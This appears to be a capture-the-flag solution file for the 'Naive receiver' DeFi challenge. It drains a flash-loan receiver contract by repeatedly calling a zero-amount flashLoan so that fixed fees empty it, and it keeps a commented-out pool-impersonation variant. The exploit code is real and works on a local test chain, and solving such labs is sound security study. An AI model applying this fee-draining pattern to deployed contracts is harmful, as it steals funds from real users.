const { ethers } = require('hardhat');
const { expect } = require('chai');
const { executeContractCallWithSigners } = require('@gnosis.pm/safe-contracts');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, attacker;
    let contractSigner;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        this.pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
       
        
        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));

        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
      
        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */     
        let balanceReceiver = ethers.utils.formatEther(await ethers.provider.getBalance(this.receiver.address))
        console.log("Balance Receiver ==>", balanceReceiver)

        let balancePool = ethers.utils.formatEther(await ethers.provider.getBalance(this.pool.address))
        console.log("Balance Pool ==>", balancePool)

        /*
        Comments: In the FlashLoanReceiver contract there is no determination of
        a maximum amount range to pay as fees, also line 26 require that the contract balance
        should greater or equal the amountToBePaid. Reading that line is clear that it is possible
        to send the total contract funds as an amount to pay. The only require that could be valid 
        is the msg.sender == pool. In case of the pool contract has any modular function in an external library(eg)
        the pool could call directly the receiver contract to collect all it's balance.
        This is what is presented in the code bellow.
        Although this is not a valid answer for the challenge because as we can see the Receiver balance
        after the transaction is zero, it does not satisfy the challange. I choose to let this here for
        1 - Study propose
        2 - It is being a vunerabity in the receiver contract.

        await ethers.provider.send("hardhat_impersonateAccount", [
            this.pool.address
        ])
        contractSigner = await ethers.getSigner(this.pool.address);

        await this.receiver.connect(contractSigner).receiveEther(ETHER_IN_RECEIVER)
       
        Balance Receiver ==> 10.0
        Balance Pool ==> 1000.0
        Balance Receiver After ==> 0.0
        Balance Pool After ==> 1009.99995228023526104

        */

        /*
        Comments: The NaiveReceiverLenderPool has no check on the msg.sender or in the borrowAmount
        to not be zero. Everytime an external user (any caller) calls this function 1 eth is send
        from the Reiver to the Pool. This attack solves the challende.
        */
        for(i = 0; i<10;i++){
            await this.pool.connect(attacker).flashLoan(this.receiver.address,0);
        }       
       
        balanceReceiver = ethers.utils.formatEther(await ethers.provider.getBalance(this.receiver.address))
        console.log("Balance Receiver After ==>", balanceReceiver)
        balancePool = ethers.utils.formatEther(await ethers.provider.getBalance(this.pool.address))
        console.log("Balance Pool After ==>", balancePool)

 

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
